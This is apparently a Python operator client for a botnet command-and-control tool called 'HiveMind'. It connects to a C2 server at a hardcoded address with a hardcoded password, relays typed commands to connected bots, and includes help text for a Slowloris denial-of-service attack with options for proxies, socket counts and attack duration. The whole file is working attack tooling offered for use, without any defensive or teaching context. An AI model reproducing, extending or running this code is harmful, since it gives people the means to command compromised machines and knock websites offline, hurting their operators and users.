import socket
import random
from threading import Thread


SERVER_HOST = "192.168.3.49"
SERVER_PORT = 420


s = socket.socket()
print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
s.connect((SERVER_HOST, SERVER_PORT))
print("[+] Connected.")


password = input('Password: ')
    

def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        print("\n" + message)


t = Thread(target=listen_for_messages)
t.daemon = True
t.start()



while True:
    if password != 'Hoey4639!':
        print('Password is incorrect, restart and try again')
        break
    to_send =  input()
    if to_send.lower() == 'q':
        break
    to_send = f"{to_send}"
    if '!help!' in to_send:
        print("""
!help!               displays this

!connected!          tells you what bots are connected

type anything to use HiveMind
""")
    if '!slowloris!' in to_send:
        print("""
Slowloris, low bandwidth stress test tool for websites

positional arguments:
  host                  Host to perform stress test on

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port of webserver, usually 80
  -s SOCKETS, --sockets SOCKETS
                        Number of sockets to use in the test
  -v, --verbose         Increases logging
  -ua, --randuseragents
                        Randomizes user-agents with each request
  -x, --useproxy        Use a SOCKS5 proxy for connecting
  --proxy-host PROXY_HOST
                        SOCKS5 proxy host
  --proxy-port PROXY_PORT
                        SOCKS5 proxy port
  --https               Use HTTPS for the requests
  --sleeptime SLEEPTIME
                        Time to sleep between each header sent.
  --duration DURATION   Duration of attack.
""")
    else: s.send(to_send.encode())

s.close()
